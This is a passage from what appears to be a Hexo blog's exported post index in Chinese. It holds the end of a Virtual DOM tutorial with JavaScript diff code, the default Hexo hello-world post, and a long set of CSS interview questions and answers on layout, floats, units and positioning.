了，直接把整个表格用模版引擎重新渲染一遍，然后设置一下innerHTML就完事了。 听到这样的做法，经验丰富的你一定第一时间意识这样的做法会导致很多的问题。最大的问题就是这样做会很慢，因为即使一个小小的状态变更都要重新构造整棵 DOM，性价比太低；而且这样做的话，input和textarea的会失去原有的焦点。最后的结论会是：对于局部的小视图的更新，没有问题（Backbone就是这么干的）；但是对于大型视图，如全局应用状态变更的时候，需要更新页面较多局部视图的时候，这样的做法不可取。 但是这里要明白和记住这种做法，因为后面你会发现，其实 Virtual DOM 就是这么做的，只是加了一些特别的步骤来避免了整棵 DOM 树变更。 另外一点需要注意的就是，上面提供的几种方法，其实都在解决同一个问题：维护状态，更新视图。在一般的应用当中，如果能够很好方案来应对这个问题，那么就几乎降低了大部分复杂性。 2. Virtual DOM算法DOM是很慢的。如果我们把一个简单的div元素的属性都打印出来，你会看到： 而这仅仅是第一层。真正的 DOM 元素非常庞大，这是因为标准就是这么设计的。而且操作它们的时候你要小心翼翼，轻微的触碰可能就会导致页面重排，这可是杀死性能的罪魁祸首。 相对于 DOM 对象，原生的 JavaScript 对象处理起来更快，而且更简单。DOM 树上的结构、属性信息我们都可以很容易地用 JavaScript 对象表示出来： 1234567891011var element = &#123; tagName: 'ul', // 节点标签名 props: &#123; // DOM的属性，用一个对象存储键值对 id: 'list' &#125;, children: [ // 该节点的子节点 &#123;tagName: 'li', props: &#123;class: 'item'&#125;, children: ["Item 1"]&#125;, &#123;tagName: 'li', props: &#123;class: 'item'&#125;, children: ["Item 2"]&#125;, &#123;tagName: 'li', props: &#123;class: 'item'&#125;, children: ["Item 3"]&#125;, ]&#125; 上面对应的HTML写法是： 12345&lt;ul id='list'&gt; &lt;li class='item'&gt;Item 1&lt;/li&gt; &lt;li class='item'&gt;Item 2&lt;/li&gt; &lt;li class='item'&gt;Item 3&lt;/li&gt;&lt;/ul&gt; 既然原来 DOM 树的信息都可以用 JavaScript 对象来表示，反过来，你就可以根据这个用 JavaScript 对象表示的树结构来构建一棵真正的DOM树。 之前的章节所说的，状态变更-&gt;重新渲染整个视图的方式可以稍微修改一下：用 JavaScript 对象表示 DOM 信息和结构，当状态变更的时候，重新渲染这个 JavaScript 的对象结构。当然这样做其实没什么卵用，因为真正的页面其实没有改变。 但是可以用新渲染的对象树去和旧的树进行对比，记录这两棵树差异。记录下来的不同就是我们需要对页面真正的 DOM 操作，然后把它们应用在真正的 DOM 树上，页面就变更了。这样就可以做到：视图的结构确实是整个全新渲染了，但是最后操作DOM的时候确实只变更有不同的地方。 这就是所谓的 Virtual DOM 算法。包括几个步骤： ==用 JavaScript 对象结构表示 DOM 树的结构；然后用这个树构建一个真正的 DOM 树，插到文档书中== ==当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异== ==把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了== Virtual DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。可以类比 CPU 和硬盘，既然硬盘这么慢，我们就在它们之间加个缓存：既然 DOM 这么慢，我们就在它们 JS 和 DOM 之间加个缓存。CPU（JS）只操作内存（Virtual DOM），最后的时候再把变更写入硬盘（DOM）。 3. 算法实现3.1 步骤一：用JS对象模拟DOM树用 JavaScript 来表示一个 DOM 节点是很简单的事情，你只需要记录它的节点类型、属性，还有子节点： element.js 123456789function Element (tagName, props, children) &#123; this.tagName = tagName this.props = props this.children = children&#125;module.exports = function (tagName, props, children) &#123; return new Element(tagName, props, children)&#125; 例如上面的 DOM 结构就可以简单的表示： 1234567var el = require('./element')var ul = el('ul', &#123;id: 'list'&#125;, [ el('li', &#123;class: 'item'&#125;, ['Item 1']), el('li', &#123;class: 'item'&#125;, ['Item 2']), el('li', &#123;class: 'item'&#125;, ['Item 3'])]) 现在ul只是一个 JavaScript 对象表示的 DOM 结构，页面上并没有这个结构。我们可以根据这个ul构建真正的: 123456789101112131415161718192021Element.prototype.render = function () &#123; var el = document.createElement(this.tagName) // 根据tagName构建 var props = this.props for (var propName in props) &#123; // 设置节点的DOM属性 var propValue = props[propName] el.setAttribute(propName, propValue) &#125; var children = this.children || [] children.forEach(function (child) &#123; var childEl = (child instanceof Element) ? child.render() // 如果子节点也是虚拟DOM，递归构建DOM节点 : document.createTextNode(child) // 如果字符串，只构建文本节点 el.appendChild(childEl) &#125;) return el&#125; render方法会根据tagName构建一个真正的DOM节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。所以只需要： 12var ulRoot = ul.render()document.body.appendChild(ulRoot) 上面的ulRoot是真正的DOM节点，把它塞入文档中，这样body里面就有了真正的ul的DOM结构： 12345&lt;ul id='list'&gt; &lt;li class='item'&gt;Item 1&lt;/li&gt; &lt;li class='item'&gt;Item 2&lt;/li&gt; &lt;li class='item'&gt;Item 3&lt;/li&gt;&lt;/ul&gt; 3.2 步骤二：比较两棵虚拟DOM树的差异正如你所预料的，比较两棵DOM树的差异是 Virtual DOM 算法最核心的部分，这也是所谓的 Virtual DOM 的 diff 算法。两个树的完全的 diff 算法是一个时间复杂度为 O(n^3) 的问题。但是在前端当中，你很少会跨越层级地移动DOM元素。所以 Virtual DOM 只会对同一个层级的元素进行对比： 上面的div只会和同一层级的div对比，第二层级的只会跟第二层级对比。这样算法复杂度就可以达到 O(n)。 3.2.1 深度优先遍历，记录差异在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记： 在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。 123456789101112131415161718192021222324252627282930// diff 函数，对比两棵树function diff (oldTree, newTree) &#123; var index = 0 // 当前节点的标志 var patches = &#123;&#125; // 用来记录每个节点差异的对象 dfsWalk(oldTree, newTree, index, patches) return patches&#125;// 对两棵树进行深度优先遍历function dfsWalk (oldNode, newNode, index, patches) &#123; // 对比oldNode和newNode的不同，记录下来 patches[index] = [...] diffChildren(oldNode.children, newNode.children, index, patches)&#125;// 遍历子节点function diffChildren (oldChildren, newChildren, index, patches) &#123; var leftNode = null var currentNodeIndex = index oldChildren.forEach(function (child, i) &#123; var newChild = newChildren[i] currentNodeIndex = (leftNode &amp;&amp; leftNode.count) // 计算节点的标识 ? currentNodeIndex + leftNode.count + 1 : currentNodeIndex + 1 dfsWalk(child, newChild, currentNodeIndex, patches) // 深度遍历子节点 leftNode = child &#125;)&#125; 例如，上面的div和新的div有差异，当前的标记是0，那么： 1patches[0] = [&#123;difference&#125;, &#123;difference&#125;, ...] // 用数组存储新旧节点的不同 3.2.2 差异类型上面说的节点的差异指的是什么呢？对 DOM 操作可能会： 替换掉原来的节点，例如把上面的div换成了section 移动、删除、新增子节点，例如上面div的子节点，把p和ul顺序互换 修改了节点的属性 对于文本节点，文本内容可能会改变。例如修改上面的文本节点2内容为Virtual DOM 2。 所以我们定义了几种差异类型： 1234var REPLACE = 0var REORDER = 1var PROPS = 2var TEXT = 3 对于节点替换，很简单。判断新旧节点的tagName和是不是一样的，如果不一样的说明需要替换掉。如div换成section，就记录下： 1234patches[0] = [&#123; type: REPALCE, node: newNode // el('section', props, children)&#125;]]]></content>
      <categories>
        <category>其他问题</category>
      </categories>
      <tags>
        <tag>其他问题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[helloworld]]></title>
    <url>%2F2018%2F05%2F06%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>firstDemo</category>
      </categories>
      <tags>
        <tag>hello</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS面试]]></title>
    <url>%2F2018%2F05%2F06%2FCSS%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[==1. 解释一下CSS的盒子模型？==盒子模型也有人称为框模型，HTML中的多数元素都会在浏览器中生成一个矩形的区域，每个区域包含四个组成部分，从外向内依次是：外边距（Margin）、边框（Border）、内边距（Padding）和内容（Content），其实盒子模型有两种，分别是 ie 盒子模型和标准 w3c 盒子模型，加上了doctype声明，让所有浏览器都会采用标准 w3c 盒子模型去解释你的盒子。 ==2. 请你说说CSS选择器的类型有哪些，并举几个例子说明其用法？==类型：基础的选择器、组合选择器、属性选择器、伪类、伪元素 基础的选择器 组合选择器 属性选择器 伪类 伪元素 ==3. 请你说说CSS有什么特殊性?（优先级、计算特殊值==优先级 同类型，同级别的样式后者先于前者 ID &gt; 类样式 &gt; 标签 &gt; * 内联&gt;ID选择器&gt;伪类&gt;属性选择器&gt;类选择器&gt;标签选择器&gt;通用选择器(*)&gt;继承的样式 具体 &gt; 泛化的，特殊性即css优先级 近的 &gt; 远的 (内嵌样式 &gt; 内部样式表 &gt; 外联样式表) 内嵌样式：内嵌在元素中，span 内部样式表：在页面中的样式，写在中的样式 外联样式表：单独存在一个css文件中，通过link引入或import导入的样式 !important 权重最高，比 inline style 还要高 计算特殊性值 important &gt; 内嵌 &gt; ID &gt; 类 &gt; 标签 | 伪类 | 属性选择 &gt; 伪对象 &gt; 继承 &gt; 通配符权重、特殊性计算法： CSS样式选择器分为4个等级，a、b、c、d 如果样式是行内样式（通过Style=“”定义），那么a=1，1,0,0,0 b为ID选择器的总数 0,1,0,0 为属性选择器，伪类选择器和class类选择器的数量。0,0,1,0 d为标签、伪元素选择器的数量 0,0,0,1 !important 权重最高，比 inline style 还要高 比如结果为：1093比1100，按位比较，从左到右，只要一位高于则立即胜出，否则继续比较。 ==4. 要动态改变层中内容可以使用的方法？==innerHTML，innerText ==5. 常见浏览器兼容性问题与解决方案？==(1)浏览器兼容问题一：不同浏览器的标签默认的外补丁和内补丁不同 问题症状：随便写几个标签，不加样式控制的情况下，各自的margin 和padding差异较大。 碰到频率:100% 解决方案：CSS里 *{margin:0;padding:0;} 备注：这个是最常见的也是最易解决的一个浏览器兼容性问题，几乎所有的CSS文件开头都会用通配符*来设置各个标签的内外补丁是0。 (2)浏览器兼容问题二：块属性标签float后，又有横行的margin情况下，在IE6显示margin比设置的大 问题症状:常见症状是IE6中后面的一块被顶到下一行 碰到频率：90%（稍微复杂点的页面都会碰到，float布局最常见的浏览器兼容问题） 解决方案：在float的标签样式控制中加入 display:inline;将其转化为行内属性 备注：我们最常用的就是div+CSS布局了，而div就是一个典型的块属性标签，横向布局的时候我们通常都是用div float实现的，横向的间距设置如果用margin实现，这就是一个必然会碰到的兼容性问题。 (3)浏览器兼容问题三：设置较小高度标签（一般小于10px），在IE6，IE7，遨游中高度超出自己设置高度 问题症状：IE6、7和遨游里这个标签的高度不受控制，超出自己设置的高度 碰到频率：60% 解决方案：给超出高度的标签设置overflow:hidden;或者设置行高line-height 小于你设置的高度。 备注：这种情况一般出现在我们设置小圆角背景的标签里。出现这个问题的原因是IE8之前的浏览器都会给标签一个最小默认的行高的高度。即使你的标签是空的，这个标签的高度还是会达到默认的行高。 (4)浏览器兼容问题四：行内属性标签，设置display:block后采用float布局，又有横行的margin的情况，IE6间距bug 问题症状：IE6里的间距比超过设置的间距 碰到几率：20% 解决方案 ： 在display:block;后面加入display:inline;display:table; 备注：行内属性标签，为了设置宽高，我们需要设置display:block;(除了input标签比较特殊)。在用float布局并有横向的margin后，在IE6下，他就具有了块属性float后的横向margin的bug。不过因为它本身就是行内属性标签，所以我们再加上display:inline的话，它的高宽就不可设了。这时候我们还需要在display:inline后面加入display:talbe。 (5) 浏览器兼容问题五：图片默认有间距 问题症状：几个img标签放在一起的时候，有些浏览器会有默认的间距，加了问题一中提到的通配符也不起作用。 碰到几率：20% 解决方案：使用float属性为img布局 备注 ： 因为img标签是行内属性标签，所以只要不超出容器宽度，img标签都会排在一行里，但是部分浏览器的img标签之间会有个间距。去掉这个间距使用float是正道。（我的一个学生使用负margin，虽然能解决，但负margin本身就是容易引起浏览器兼容问题的用法，所以我禁止他们使用） (6) 浏览器兼容问题六：标签最低高度设置min-height不兼容 问题症状：因为min-height本身就是一个不兼容的CSS属性，所以设置min-height时不能很好的被各个浏览器兼容 碰到几率：5% 解决方案：如果我们要设置一个标签的最小高度200px，需要进行的设置为：{min-height:200px; height:auto !important; height:200px; overflow:visible;} 备注：在B/S系统前端开时，有很多情况下我们又这种需求。当内容小于一个值（如300px）时。容器的高度为300px；当内容高度大于这个值时，容器高度被撑高，而不是出现滚动条。这时候我们就会面临这个兼容性问题。 (7)浏览器兼容问题七：透明度的兼容CSS设置 一般在ie中用的是filter:alpha(opacity=0);这个属性来设置div或者是块级元素的透明度，而在firefox中，一般就是直接使用opacity:0,对于兼容的，一般的做法就是在书写css样式的将2个都写上就行，就能实现兼容 ==6. 列出display的值并说明他们的作用？==display： none | inline | block | list-item | inline-block | table | inline-table | table-caption | table-cell | table-row | table-row-group | table-column | table-column-group | table-footer-group | table-header-group | run-in | box | inline-box | flexbox | inline-flexbox | flex | inline-flex 默认值：inline none： 隐藏对象。与visibility属性的hidden值不同，其不为被隐藏的对象保留其物理空间 inline： 指定对象为内联元素。 block： 指定对象为块元素。 list-item： 指定对象为列表项目。 inline-block： 指定对象为内联块元素。（CSS2） table： 指定对象作为块元素级的表格。类同于html标签（CSS2） inline-table： 指定对象作为内联元素级的表格。类同于html标签（CSS2） table-caption： 指定对象作为表格标题。类同于html标签（CSS2） table-cell： 指定对象作为表格单元格。类同于html标签（CSS2） table-row： 指定对象作为表格行。类同于html标签（CSS2） table-row-group： 指定对象作为表格行组。类同于html标签（CSS2） table-column： 指定对象作为表格列。类同于html标签（CSS2） table-column-group： 指定对象作为表格列组显示。类同于html标签（CSS2） table-header-group： 指定对象作为表格标题组。类同于html标签（CSS2） table-footer-group： 指定对象作为表格脚注组。类同于html标签（CSS2） run-in： 根据上下文决定对象是内联对象还是块级对象。（CSS3） box： 将对象作为弹性伸缩盒显示。（伸缩盒最老版本）（CSS3） inline-box： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒最老版本）（CSS3） flexbox： 将对象作为弹性伸缩盒显示。（伸缩盒过渡版本）（CSS3） inline-flexbox： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒过渡版本）（CSS3） flex： 将对象作为弹性伸缩盒显示。（伸缩盒最新版本）（CSS3） inline-flex： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒最新版本）（C ==7. 如何居中div, 如何居中一个浮动元素?== 非浮动元素居中：可以设置 margin:0 auto 令其居中, 定位 ,父级元素text-algin:center等等 浮动元素居中: 方法一:设置当前div的宽度，然后设置margin-left:50%; position:relative; left:-250px;其中的left是宽度的一半。 方法二:父元素和子元素同时左浮动，然后父元素相对左移动50%，再然后子元素相对左移动-50%。 方法三:position定位等等。 ==8. CSS中 link 和@import 的区别是？== link属于HTML标签，而@import是CSS提供的; 页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载; @import只在IE5以上才能识别，而link是HTML标签，无兼容问题; link方式的样式的权重 高于@import的权重. ==9. 请列举几种清除浮动的方法(至少两种)?== 父级div定义 height 原理：父级div手动定义height，就解决了父级div无法自动获取到高度的问题。 优点：简单、代码少、容易掌握 缺点：只适合高度固定的布局，要给出精确的高度，如果高度和父级div不一样时，会产生问题 建议：不推荐使用，只建议高度固定的布局时使用 结尾处加空div标签 clear:both 原理：添加一个空div，利用css提高的clear:both清除浮动，让父级div能自动获取到高度 优点：简单、代码少、浏览器支持好、不容易出现怪问题 缺点：不少初学者不理解原理；如果页面浮动布局多，就要增加很多空div，让人感觉很不好 建议：不推荐使用，但此方法是以前主要使用的一种清除浮动方法 父级div定义 伪类:after 和 zoom 原理：IE8以上和非IE浏览器才支持:after，原理和方法2有点类似，zoom(IE转有属性)可解决ie6,ie7浮动问题 优点：浏览器支持好、不容易出现怪问题（目前：大型网站都有使用，如：腾迅，网易，新浪等等） 缺点：代码多、不少初学者不理解原理，要两句代码结合使用才能让主流浏览器都支持。 建议：推荐使用，建议定义公共类，以减少CSS代码。 父级div定义 overflow:hidden 原理：必须定义width或zoom:1，同时不能定义height，使用overflow:hidden时，浏览器会自动检查浮动区域的高度 优点：简单、代码少、浏览器支持好 缺点：不能和position配合使用，因为超出的尺寸的会被隐藏。 建议：只推荐没有使用position或对overflow:hidden理解比较深的朋友使用。 父级div定义 overflow:auto 原理：必须定义width或zoom:1，同时不能定义height，使用overflow:auto时，浏览器会自动检查浮动区域的高度 优点：简单、代码少、浏览器支持好 缺点：内部宽高超过父级div时，会出现滚动条。 建议：不推荐使用，如果你需要出现滚动条或者确保你的代码不会出现滚动条就使用吧。 ==10. block，inline和inlinke-block细节对比？== display:block block元素会独占一行，多个block元素会各自新起一行。默认情况下，block元素宽度自动填满其父元素宽度。 block元素可以设置width,height属性。块级元素即使设置了宽度,仍然是独占一行。 block元素可以设置margin和padding属性。 display:inline inline元素不会独占一行，多个相邻的行内元素会排列在同一行里，直到一行排列不下，才会新换一行，其宽度随元素的内容而变化。 inline元素设置width,height属性无效。 inline元素的margin和padding属性，水平方向的padding-left, padding-right, margin-left, margin-right都产生边距效果；但竖直方向的padding-top, padding-bottom, margin-top, margin-bottom不会产生边距效果。 display:inline-block 简单来说就是将对象呈现为inline对象，但是对象的内容作为block对象呈现。之后的内联对象会被排列在同一行内。比如我们可以给一个link（a元素）inline-block属性值，使其既具有block的宽度高度特性又具有inline的同行特性。 补充说明 一般我们会用display:block，display:inline或者display:inline-block来调整元素的布局级别，其实display的参数远远不止这三种，仅仅是比较常用而已。 IE（低版本IE）本来是不支持inline-block的，所以在IE中对内联元素使用display:inline-block，理论上IE是不识别的，但使用display:inline-block在IE下会触发layout，从而使内联元素拥有了display:inline-block属性的表象。 ==11. 什么叫优雅降级和渐进增强？== 优雅降级： Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。由于IE独特的盒模型布局问题，针对不同版本的IE的hack实践过优雅降级了,为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效. 渐进增强： 从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。 ==12. 说说浮动元素会引起的问题和你的解决办法== 问题： （1）父元素的高度无法被撑开，影响与父元素同级的元素 （2）与浮动元素同级的非浮动元素会跟随其后 （3）若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构 解决方法： 使用CSS中的clear:both;属性来清除元素的浮动可解决问题(2)、(3)，对于问题(1)，添加如下样式，给父元素添加clearfix样式：12.clearfix:after&#123;content: ".";display: block;height: 0;clear: both;visibility: hidden;&#125;.clearfix&#123;display: inline-block;&#125; /* for IE/Mac */ ==13. 你有哪些性能优化的方法？== 减少http请求次数：CSS Sprites, JS、CSS源码压缩、图片大小控制合适；网页Gzip，CDN托管，data缓存 ，图片服务器。 前端模板 JS+数据，减少由于HTML标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数 用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能。 当需要设置的样式很多时设置className而不是直接操作style。 少用全局变量、缓存DOM节点查找的结果。减少IO读取操作。 避免使用CSS Expression（css表达式)又称Dynamic properties(动态属性)。 图片预加载，将样式表放在顶部，将脚本放在底部加上时间戳。 ==14. 为什么要初始化CSS样式？==因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。 ==15. 解释下浮动和它的工作原理？清除浮动的技巧？==浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。 使用空标签清除浮动。 这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。 使用overflow。 给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。 使用after伪对象清除浮动。 该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素； ==16. CSS样式表根据所在网页的位置，可分为哪几种样式表？==行内样式表，内嵌样式表，外部样式表 ==17. 谈谈你对CSS中刻度的认识？== 在CSS中刻度是用于设置元素尺寸的单位。 a、特殊值0可以省略单位。例如：margin:0px可以写成margin:0 b、一些属性可能允许有负长度值，或者有一定的范围限制。如果不支持负长度值，那应该变换到能够被支持的最近的一个长度值。 c、长度单位包括：相对单位和绝对单位。 相对长度单位有： em, ex, ch, rem, vw, vh, vmax, vmin 绝对长度单位有： cm, mm, q, in, pt, pc, px 绝对长度单位：1in = 2.54cm = 25.4 mm = 72pt = 6pc = 96px 文本相对长度单位：em 相对长度单位是相对于当前对象内文本的字体尺寸，如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。(相对父元素的字体大小倍数) 12345body &#123; font-size: 14px; &#125;h1 &#123; font-size: 16px; &#125;.size1 p &#123; font-size: 1em; &#125;.size2 p &#123; font-size: 2em; &#125;.size3 p &#123; font-size: 3em; &#125; 文本相对长度单位：rem rem是CSS3新增的一个相对单位（root em，根em），相对于根元素(即html元素)font-size计算值的倍数 只相对于根元素的大小 浏览器的默认字体大小为16像素，浏览器默认样式也称为user agent stylesheet，就是所有浏览器内置的默认样式，多数是可以被修改的，但chrome不能直接修改，可以被用户样式覆盖。 ==18. 请你说说em与rem的区别？== rem rem是CSS3新增的一个相对单位（root em，根em），相对于根元素(即html元素)font-size计算值的倍数 只相对于根元素的大小 rem（font size of the root element）是指相对于根元素的字体大小的单位。简单的说它就是一个相对单位。 作用：利用rem可以实现简单的响应式布局，可以利用html元素中字体的大小与屏幕间的比值设置font-size的值实现当屏幕分辨率变化时让元素也变化，以前的天猫tmall就使用这种办法 em 文本相对长度单位。相对于当前对象内文本的字体尺寸。如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸(默认16px)。(相对父元素的字体大小倍数) em（font size of the element）是指相对于父元素的字体大小的单位。它与rem之间其实很相似，区别在。（相对是的HTML元素的字体大，默认16px） em与rem的重要区别： 它们计算的规则一个是依赖父元素另一个是依赖根元素计算 ==19. 请你说说box-sizing属性的的用法？==设置或检索对象的盒模型组成模式 a、box-sizing:content-box： padding和border不被包含在定义的width和height之内。对象的实际宽度等于设置的width值和border、padding之和，即 ( Element width = width + border + padding，但占有页面位置还要加上margin ) 此属性表现为标准模式下的盒模型。 b、box-sizing:border-box： padding和border被包含在定义的width和height之内。对象的实际宽度就等于设置的width值，即使定义有border和padding也不会改变对象的实际宽度，即 ( Element width = width ) 此属性表现为怪异模式下的盒模型。 ==20. 浏览器标准模式和怪异模式之间的区别是什么？==在“标准模式”(Standards Mode) 页面按照 HTML 与 CSS 的定义渲染，而在“怪异模式”(Quirks Mode)就是浏览器为了兼容很早之前针对旧版本浏览器设计、并未严格遵循 W3C 标准的网页而产生的一种页面渲染模式。浏览器基于页面中文件类型描述的存在以决定采用哪种渲染模式；如果存在一个完整的DOCTYPE则浏览器将会采用标准模式，而如果它缺失则浏览器将会采用怪异模式。 强烈建议阅读加深理解：[怪异模式（Quirks Mode）对 HTML 页面的影响]link(http://www.ibm.com/developerworks/cn/web/1310_shatao_quirks/)，这里列下浏览器标准模式和怪异模式的区别： 盒模型： 在怪异模式下，盒模型为IE盒模型而非标准模式下的W3C 盒模型：在 IE 盒模型中，box width = content width + padding left + padding right + border left + border right，- box height = content height + padding top + padding bottom + border top + border bottom。而在 W3C 标准的盒模型中，box 的大小就是 content 的大小。 图片元素的垂直对齐方式: 对于inline元素和table-cell元素，在 IE Standards Mode 下 vertical-align 属性默认取值为baseline。而当inline元素的内容只有图片时，如table的单元格table-cell。在 IE Quirks Mode 下，table单元格中的图片的 vertical-align 属性默认为bottom，因此，在图片底部会有几像素的空间。 &lt;table&gt;元素中的字体: CSS 中，描述font的属性有font-family，font-size，font-style，font-weigh,上述属性都是可以继承的。而在 IE Quirks Mode 下，对于table 元素，字体的某些属性将不会从body或其他封闭元素继承到table中，特别是 font-size属性。 内联元素的尺寸: 在 IE Standards Mode 下，non-replaced inline 元素无法自定义大小，而在 IE Quirks Mode 下，定义这些元素的width和height 属性，能够影响该元素显示的大小尺寸。 元素的百分比高度: a、CSS 中对于元素的百分比高度规定如下，百分比为元素包含块的高度，不可为负值。如果包含块的高度没有显式给出，该值等同于“auto”（即取决于内容的高度）。所以百分比的高度必须在父元素有声明高度时使用。 b、当一个元素使用百分比高度时，在 IE Standards Mode 下，高度取决于内容的变化，而在 Quirks Mode 下，百分比高度则被正确应用。 元素溢出的处理： 在 IE Standard Mode 下，overflow取默认值 visible，即溢出可见，这种情况下，溢出内容不会被裁剪，呈现在元素框外。而在 Quirks Mode 下，该溢出被当做扩展box来对待，即元素的大小由其内容决定，溢出不会被裁剪，元素框自动调整，包含溢出内容 ==21. 说说你对边距折叠的理解?== 外边距折叠： 相邻的两个或多个外边距 (margin) 在垂直方向会合并成一个外边距（margin） 相邻： 没有被非空内容、padding、border 或 clear 分隔开的margin特性. 非空内容就是说这元素之间要么是兄弟关系或者父子关系 垂直方向外边距合并计算: 参加折叠的margin都是正值：取其中 margin 较大的值为最终 margin 值。 参与折叠的 margin 都是负值：取的是其中绝对值较大的，然后，从 0 位置，负向位移。 参与折叠的 margin 中有正值，有负值：先取出负 margin 中绝对值中最大的，然后，和正 margin 值中最大的 margin 相加。 ==22. 说说隐藏元素的方式有哪些？== 使用CSS的display:none，不会占有原来的位置 使用CSS的display:hidden，会占有原来的位置 使用CSS的visibility:hidden，会占有原来的位置 使用HTML5中的新增属性hidden=”hidden”，不会占有原来的位置 ==23. 为什么重置浏览器默认样式，如何重置默浏览器认样式？==每种浏览器都有一套默认的样式表，即user agent stylesheet，网页在没有指定的样式时，按浏览器内置的样式表来渲染。这是合理的，像word中也有一些预留样式，可以让我们的排版更美观整齐。不同浏览器甚至同一浏览器不同版本的默认样式是不同的。但这样会有很多兼容问题。 最简单的办法：（不推荐使用）*{margin: 0;padding: 0;}。 使用CSSReset可以将所有浏览器默认样式设置成一样。 normalize：也许有些cssreset过于简单粗暴，有点伤及无辜，normalize是另一个选择。bootstrap已经引用该css来重置浏览器默认样式，比普通的cssreset要精细一些，保留浏览器有用的默认样式，支持包括手机浏览器在内的超多浏览器，同时对HTML5元素、排版、列表、嵌入的内容、表单和表格都进行了一般化。 ==24. 谈谈你对BFC与IFC的理解？(是什么，如何产生，作用)== 什么是BFC与IFC BFC（Block Formatting Context）即“块级格式化上下文”， IFC（Inline Formatting Context）即行内格式化上下文。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态。一个框在常规流中必须属于一个格式化上下文，你可以把BFC想象成一个大箱子，箱子外边的元素将不与箱子内的元素产生作用。 BFC是W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行定位，以及与其他元素的关系和相互作用。当涉及到可视化布局的时候，Block Formatting Context提供了一个环境，HTML元素在这个环境中按照一定规则进行布局。一个环境中的元素不会影响到其它环境中的布局。比如浮动元素会形成BFC，浮动元素内部子元素的主要受该浮动元素影响，两个浮动元素之间是互不影响的。也可以说BFC就是一个作用范围。 在普通流中的 Box(框) 属于一种 formatting context(格式化上下文) ，类型可以是 block ，或者是 inline ，但不能同时属于这两者。并且， Block boxes(块框) 在 block formatting context(块格式化上下文) 里格式化， Inline boxes(块内框) 则在 Inline Formatting Context(行内格式化上下文) 里格式化。 如何产生BFC 当一个HTML元素满足下面条件的任何一点，都可以产生Block Formatting Context： float的值不为none overflow的值不为visible display的值为table-cell, table-caption, inline-block中的任何一个 position的值不为relative和static CSS3触发BFC方式则可以简单描述为：在元素定位非static，relative的情况下触发，float也是一种定位方式。 (3)、BFC的作用与特点 不和浮动元素重叠，清除外部浮动，阻止浮动元素覆盖 如果一个浮动元素后面跟着一个非浮动的元素，那么就会产生一个重叠的现象。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态，当float不为none时，position为absolute、fixed时元素将脱离标准流。 ==25. 说说你对页面中使用定位(position)的理解？==使用css布局position非常重要，语法如下：position：static | relative | absolute | fixed | center | page | sticky默认值：static，center、page、sticky是CSS3中新增加的值。 static 可以认为静态的，默认元素都是静态的定位，对象遵循常规流。此时4个定位偏移属性不会被应用，也就是使用left，right，bottom，top将不会生效。 relative 相对定位，对象遵循常规流，并且参照自身在常规流中的位置通过top，right，bottom，left这4个定位偏移属性进行偏移时不会影响常规流中的任何元素。 absolute 绝对定位，对象脱离常规流，此时偏移属性参照的是离自身最近的定位祖先元素，如果没有定位的祖先元素，则一直回溯到body元素。盒子的偏移位置不影响常规流中的任何元素，其margin不与其他任何margin折叠。 元素定位参考的是离自身最近的定位祖先元素，要满足两个条件，第一个是自己的祖先元素，可以是父元素也可以是父元素的父元素，一直找，如果没有则选择body为对照对象。第二个条件是要求祖先元素必须定位，通俗说就是position的属性值为非static都行。 fixed 固定定位，与absolute一致，但偏移定位是以窗口为参考。当出现滚动条时，对象不会随着滚动。 center 与absolute一致，但偏移定位是以定位祖先元素的中心点为参考。盒子在其包含容器垂直水平居中。（CSS3） 、page 与absolute一致。元素在分页媒体或者区域块内，元素的包含块始终是初始包含块，否则取决于每个absolute模式。（CSS3） sticky 对象在常态时遵循常规流。它就像是relative和fixed的合体，当在屏幕中时按常规流排版，当卷动到屏幕外时则表现如fixed。该属性的表现是现实中你见到的吸附效果。（CSS3） ==26. 如何解决多个元素重叠问题？== 使用z-index属性可以设置元素的层叠顺序 z-index属性 